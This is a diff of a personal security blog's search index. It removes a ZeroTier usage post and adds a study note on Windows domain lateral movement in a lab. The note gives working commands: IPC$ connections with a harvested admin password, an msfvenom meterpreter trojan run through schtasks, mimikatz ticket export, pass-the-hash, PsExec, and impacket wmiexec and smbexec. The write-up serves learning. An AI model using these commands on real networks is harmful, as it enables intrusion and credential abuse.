-<p><a href="https://www.bilibili.com/video/BV1hK4y1L7ND/?buvid=XU7B1187220CEA5BEB8E1D6547D1ECD2814F4&amp;is_story_h5=false&amp;mid=CZP6291YuQ9EvlArsK6mQw%3D%3D&amp;p=1&amp;plat_id=114&amp;share_from=ugc&amp;share_medium=android&amp;share_plat=android&amp;share_session_id=bb883d71-ff0f-45c4-ac3a-cdd56ff7cf9b&amp;share_source=COPY&amp;share_tag=s_i&amp;timestamp=1676083314&amp;unique_k=arTrXpi&amp;up_id=35973342&amp;vd_source=b2a0cc29ab6a8cf18c26c53dcd232ca4">强大的内网穿透工具ZeroTier，随时随地远程访问家中NAS和其它设备！没有公网IP也不怕_哔哩哔哩_bilibili</a></p>
-<p>同时centos 的安装可以参照这位大佬的文章</p>
-<p><a href="https://blog.csdn.net/COCO56/article/details/123296985#">https://blog.csdn.net/COCO56/article/details/123296985#</a></p>
-<h2 id="体验">体验</h2>
-<p>Zerotier和传统的内网穿透工具不同，并不是通过一个中转服务器来建立连接的，而是使用端到端的<strong>p2p</strong>协议（在连接不稳定的时候也会采用中转服务器的方式建立连接）</p>
-<p><img src="https://img-blog.csdnimg.cn/d14f7e6dbc424d29a8a9137b177fb8a2.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>可以看到延迟并不算很高，这几天用下来个人还是比较满意的</p>
-<p>通过这种方式可以部署一些<strong>只有内网ipv4才可以访问</strong>的服务，例如我就用niginx开了个ipv4的端口，将数据转发到了路由器上，下次ipv6出现问题也就可以直接通过Zerotier访问路由器重启ipv6服务</p>
-<h2 id="安全性">安全性</h2>
-<p>Zerotier作为一款强大的网络存取服务，拥有内置的AES-256加密算法，并提供安全控制，可以控制用户连接的访问，以限制对私有网络的访问，并防止未经授权的访问，所以Zerotier的安全性还是比较高的</p>
-<h1>结语</h1>
-<p>总的来说，ZeroTier的使用确实非常容易。它的简单易用性，功能丰富的网络功能和强大的安全特性，使ZeroTier成为最佳的专业网络解决方案，特别是在新兴兼容性和技术能力需求时期。</p>
-<p>（此段结语由ChatGPT生成，嘻嘻~~，总的来说Zerotier还是比较简单好用的，有内网访问需求的伙伴们可以考虑使用）</p>
-]]></content>
-      <categories>
-        <category>使用体验</category>
-      </categories>
-      <tags>
-        <tag>zerotier</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>后渗透之横向移动（学习记录）</title>
     <url>/post/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%EF%BC%88%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%89/</url>
-    <content><![CDATA[<h1>环境</h1>
+    <content><![CDATA[<h1 id="环境">环境</h1>
 <p>已经拿下了一台域内win7的shell，同时获得了system权限<br>
 目标机是一台win2008，ip地址192.168.138.138</p>
-<h1>ipc连接</h1>
+<h1 id="ipc连接">ipc连接</h1>
 <p>使用条件：<code>对方开启了139和445端口</code>&amp;&amp;<code>对方开启了默认共享</code><br>
 通过mimikatz在win7上拿到了域管理员Administrator的明文密码</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net use \\192.168.138.138\ipc$ &quot;Admin@123&quot; /user:Administrator</span><br></pre></td></tr></table></figure>
 <p>通过<code>net use</code>查看已经建立的ipc连接<br>
 <img src="59df3dbf616d4e9bbe97a20a5133463d.png" alt=""></p>
-<h1>计划任务</h1>
+<h1 id="计划任务">计划任务</h1>
 <p>思路是通过计划任务运行上传的木马文件从而拿shell</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#由于对方在内网，所以要通过正向连接的方式创建木马</span><br><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp RHOST=192.168.138.138 LPORT=5555 -f exe &gt;f.exe</span><br><span class="line">#将木马复制到对方的c盘下</span><br><span class="line">copy f.exe \\192.168.138.138\c$</span><br><span class="line">#查看是否复制成功</span><br><span class="line">dir \\192.168.138.138\c$</span><br></pre></td></tr></table></figure>
 <p><img src="3c0619264b39461bab91b56ed157b44e.png" alt=""></p>
@@ -417,7 +423,7 @@
 <blockquote>
 <p>注：在使用schtasks的时候会留下日志文件C:/Windows/Tasks/SchedLgu.txt</p>
 </blockquote>
-<h1>哈希传递（PTH）</h1>
+<h1 id="哈希传递（PTH）">哈希传递（PTH）</h1>
 <p><code>哈希传递（Pass the Hash ）攻击</code>是一种利用 Windows 系统的身份验证机制漏洞的网络攻击方式。攻击者通过获取到<code>已经被哈希过的用户密码信息（而不是明文密码）</code>，然后将该信息直接传递给目标系统进行身份验证，从而绕过密码验证步骤来获得系统访问权限（需要管理员权限）。<br>
 对于win2012以上的windows，或者win2002以下的打了KB2871997补丁的windows是读不了明文的，而这种攻击方式通常利用 Windows 系统中的 NTLM 身份认证协议，攻击者可以在未授权的情况下获取到用户的 NTLM 哈希值，并使用它来尝试登录目标系统，从而执行任意操作，甚至完全控制受攻击系统。</p>
 <p>这里为了演示，先打开win7的3389，再通过操纵win7打win2008<br>
@@ -432,7 +438,7 @@ rdesktop连接：<code>rdesktop -u Administrator -p Admin@123 -d sun 192.168.135
 <blockquote>
 <p>注：这里只能使用域控的名字而不能使用ip地址访问</p>
 </blockquote>
-<h1>票据传递（PTT）</h1>
+<h1 id="票据传递（PTT）">票据传递（PTT）</h1>
 <p>票据传递攻击（Pass the Ticket Attack）是一种利用 Windows 系统的 Kerberos 身份验证协议漏洞的攻击方式。攻击者可以获取到受害者计算机上的 Kerberos 认证票据，并将其传递给其他系统，以获得访问权限。<br>
 将内存中的票据导出：<code>sekurlsa::tickets /export</code><br>
 可以看到出现了许多的票据文件<br>
@@ -449,7 +455,7 @@ rdesktop连接：<code>rdesktop -u Administrator -p Admin@123 -d sun 192.168.135
 票据传递攻击是基于 Kerberos 认证协议的攻击，攻击者通过获取到受害者计算机上的 <code>Kerberos 认证票据（TGT）</code>，并将其传递给其他系统来获得访问权限。<br>
 而哈希传递攻击则是基于 NTLM 身份认证协议的攻击，攻击者通过获取到<code>已经被哈希过的用户密码信息（而不是明文密码）</code>，然后将该信息直接传递给目标系统进行身份验证，从而绕过密码验证步骤来获得系统访问权限。</p>
 </blockquote>
-<h1>PsExec</h1>
+<h1 id="PsExec">PsExec</h1>
 <p><code>PsExec</code>是一个由Sysinternals（现在属于微软）开发的免费实用程序，可以在本地或远程计算机上执行命令。它允许管理员在没有登录目标计算机的情况下，远程执行命令并获取结果。PsExec利用 Windows 系统中的网络共享和远程执行服务，通过远程调用进程、服务等方式来进行远程控制（需要提前下载）。<br>
 PsExec 连接到目标计算机并将 PsExec 服务程序复制到目标计算机的系统目录中，同时在目标计算机上启动一个服务 (PSEXESVC)，该服务会等待来自 PsExec 的指令。PsExec 使用 Windows RPC（远程过程调用）协议与 PSEXESVC 通信，以向其发送要执行的命令。PSEXESVC 接收到命令后，会在目标计算机上启动相应的进程，并将结果返回给 PsExec。<br>
 在已经建立了ipc的情况下，可以直接通过psexec拿域控的system权限的shell</p>
@@ -467,7 +473,7 @@ PsExec 连接到目标计算机并将 PsExec 服务程序复制到目标计算�
 <img src="0d06b94cf3744fd8bf6f82dcb3df3719.png" alt=""><br>
 在msf中使用psexec如果对方防火墙开着的话，就会连接失败<br>
 <img src="7fe56df5233f408db138f534a479876a.png" alt=""></p>
-<h1>WMI</h1>
+<h1 id="WMI">WMI</h1>
 <p><code>WMI（Windows Management Instrumentation，Windows管理规范）</code>是一种由微软开发的系统管理技术，用于在Windows操作系统中收集和监控各种系统信息，以及执行系统管理任务。<br>
 <code>WMIC（Windows Management Instrumentation Command-Line，Windows管理规范命令行）</code>是一种基于WMI技术的命令行工具，用于在Windows操作系统中执行系统管理任务。通过WMIC命令行工具，管理员可以使用命令行界面来调用WMI接口，并执行各种管理任务，例如获取系统信息、配置系统参数、监控性能和事件等。WMIC命令行工具提供了丰富的命令选项和参数，支持多种数据格式和输出方式，适用于本地计算机和远程计算机上的管理任务。<br>
 在win7中输入</p>
@@ -478,14 +484,14 @@ win2008出现ip.txt说明命令成功执行<br>
 <p>也可以通过impacket包（要下载）的wimexec来登录（实测有防火墙也能打）</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用法：wmiexec.py user:pass@ip</span>  </span><br><span class="line">proxychains wmiexec.py administrator:Admin@123@192.168.138.138 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">proxychains 是因为目标在内网开了代理</span></span><br></pre></td></tr></table></figure>
 <p><img src="3e6af64105484320825ab49b2f78cc0f.png" alt=""></p>
-<h1>SMB</h1>
+<h1 id="SMB">SMB</h1>
 <p><code>SMB（Server Message Block，服务器消息块）</code>是一种用于文件和打印机共享的网络协议，通过SMB协议，客户端可以与远程计算机上的共享资源进行通信和交互，例如读取或写入共享文件、访问共享打印机等。SMB协议基于客户端/服务器模型，其中客户端向SMB服务器发送请求，并在响应中获取所需的数据。<br>
 <code>SMBexec</code>是一种基于SMB协议的渗透测试工具，利用SMB协议的漏洞和不安全配置与目标计算机进行通信和交互，以执行各种攻击任务。<br>
 impacket中有smbexec.py工具可以用来攻击<br>
 使用方法和wmiexec类似</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains smbexec.py Administrator:Admin@123@192.168.138.138   </span><br></pre></td></tr></table></figure>
 <p><img src="aa493e42938f4eb682654418fb32567b.png" alt=""></p>
-<h1>最后</h1>
+<h1 id="最后">最后</h1>
 <p>除此之外，还可以利用一些windows内核漏洞（例如永恒之蓝）去横向，就不多说了。<br>
 可以看到大多数的横向移动都是建立在拥有一个高权限用户和获取到明文密码的前提下的，所以前期的信息收集和权限提升步骤也不必可少。</p>
 ]]></content>
@@ -495,11 +501,5 @@ impacket中有smbexec.py工具可以用来攻击<br>
       <tags>
         <tag>后渗透</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>新年好</title>
-    <url>/post/happy-new-year/</url>
-    <content><![CDATA[<p>欢迎来到1y0ng的blog,今天是2023年的第一天，祝大家新年快乐</p>
-]]></content>
   </entry>
 </search>
